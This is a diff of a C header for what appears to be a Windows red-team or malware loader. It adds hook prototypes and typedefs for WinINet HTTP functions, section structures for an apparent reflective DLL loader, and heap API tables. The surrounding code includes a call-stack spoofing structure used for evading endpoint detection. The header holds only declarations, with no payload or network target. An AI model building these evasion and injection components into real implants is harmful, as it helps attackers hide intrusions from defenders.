@@ -5,9 +5,10 @@
 #ifndef STACK_CALL_PROJSTRUCTS_H
 #define STACK_CALL_PROJSTRUCTS_H
 #include <Windows.h>
-
+#define FUNC_ADDRESS(func) ((uintptr_t)(void *)(func))
+__MINGW_EXTENSION typedef unsigned long long   uint64_t;
+#define GRP_SEC( x ) __attribute__(( section( ".text$" #x ) ))
 #define STATUS_SUCCESS 0x0
-#define MAX_STACK_SIZE 12000
 #define RBP_OP_INFO 0x5
 #define true 1
 
@@ -60,8 +61,39 @@ typedef NTSTATUS  (NTAPI * t_NtUnmapViewOfSection)( IN HANDLE ProcessHandle, IN 
 typedef PVOID    (NTAPI * tNtDelayExecution)( BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
 typedef PVOID  (WINAPI * tGetProcessHeap)();
 typedef PVOID  (WINAPI * tHeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
+typedef PVOID  (WINAPI * tHeapFree) (HANDLE, DWORD, PVOID);
 typedef DWORD (WINAPI *tWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
 typedef int (WINAPI *tMessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
+typedef PVOID  (WINAPI * DLLMAIN)( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved);
+
+
+#define HINTERNET PVOID
+LPVOID InternetOpenA_Hook(BYTE* lpszAgent, DWORD dwAccessType, BYTE* lpszProxy, BYTE* lpszProxyBypass, DWORD  dwFlags);
+LPVOID InternetConnectA_Hook(PVOID hInternet, LPCSTR lpszServerName, WORD nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
+LPVOID HttpOpenRequestA_Hook(PVOID hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
+BOOL HttpSendRequestA_Hook(PVOID hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
+BOOL InternetReadFile_Hook(PVOID hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
+BOOL InternetQueryDataAvailable_Hook(PVOID hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
+BOOL InternetCloseHandle_Hook(HINTERNET hInternet);
+BOOL InternetQueryOptionA_Hook(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength);
+BOOL InternetSetOptionA_Hook(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
+BOOL InternetSetStatusCallback_Hook(HINTERNET hInternet, PVOID lpfnInternetCallback);
+BOOL HttpAddRequestHeadersA_Hook(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
+BOOL HttpQueryInfoA_Hook(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
+
+typedef LPVOID(* t_InternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
+typedef LPVOID(* t_InternetConnectA)(HANDLE, LPCSTR, WORD, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
+typedef LPVOID(* t_HttpOpenRequestA)(LPVOID, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
+typedef BOOL(* t_HttpSendRequestA)(LPVOID, LPCSTR, DWORD, LPVOID, DWORD);
+typedef BOOL(* t_InternetReadFile)(LPVOID, LPVOID, DWORD, LPDWORD);
+typedef BOOL(* t_InternetQueryDataAvailable)(PVOID hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
+typedef BOOL(* t_InternetCloseHandle)(LPVOID);
+typedef BOOL(* t_InternetQueryOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength);
+typedef BOOL(* t_InternetSetOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
+typedef BOOL(* t_InternetSetStatusCallback)(HINTERNET hInternet, PVOID lpfnInternetCallback);
+typedef BOOL(* t_HttpAddRequestHeadersA)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
+typedef BOOL(* t_HttpQueryInfoA)(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
+
 /*
  * 自定义
  */
@@ -135,7 +167,29 @@ typedef struct Spoof_Struct
     PVOID frame_2_return_address;    // +0x88 ThreadStartAddress
 } Spoof_Struct, * pSpoof_Struct;
 
-
+typedef struct Section {
+    PVOID RVA;
+    PVOID dst_rdll_VA;
+    PVOID src_rdll_VA;
+    PVOID PointerToRawData;
+    DWORD SizeOfSection;
+    DWORD Characteristics;
+}Section;
+typedef struct wininet_apis
+{
+    t_InternetOpenA               InternetOpenA;
+    t_InternetConnectA            InternetConnectA;
+    t_HttpOpenRequestA            HttpOpenRequestA;
+    t_HttpSendRequestA            HttpSendRequestA;
+    t_InternetReadFile            InternetReadFile;
+    t_InternetQueryDataAvailable  InternetQueryDataAvailable;
+    t_InternetCloseHandle         InternetCloseHandle;
+    t_InternetQueryOptionA        InternetQueryOptionA;
+    t_InternetSetOptionA          InternetSetOptionA;
+    t_InternetSetStatusCallback   InternetSetStatusCallback;
+    t_HttpAddRequestHeadersA      HttpAddRequestHeadersA;
+    t_HttpQueryInfoA              HttpQueryInfoA;
+}wininet_apis;
 typedef struct Export {
     PVOID   Directory;
     DWORD DirectorySize;
@@ -173,14 +227,21 @@ typedef struct Dll {
     VOID                     * import_directory;
     DWORD              import_directory_size;
 }Dll, *PDll;
+
+typedef struct HEAP_APIS{
+    tGetProcessHeap GetProcessHeap;
+    tHeapAlloc      HeapAlloc;
+    tHeapFree       HeapFree;
+}HEAP_APIS;
+
 typedef struct APIS {
     struct ker32 {
         tLoadLibraryA LoadLibraryA;
         t_LoadLibraryExA LoadLibraryEx;
-        tHeapAlloc HeapAlloc;
-        tGetProcessHeap GetProcessHeap;
         t_CreateFileMappingA CreateFileMappingA;
         t_MapViewOfFile MapViewOfFile;
+        tHeapAlloc HeapAlloc;
+        tGetProcessHeap GetProcessHeap;
     } ker32;
 
     struct ntdll {
@@ -205,7 +266,7 @@ typedef struct APIS {
  */
 extern VOID CALLBACK WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
 // 声明汇编函数原型
-extern PVOID  NTAPI spoof_synthetic_callstack(PVOID  a, ...);
+
 /*
  *   HASH
  */
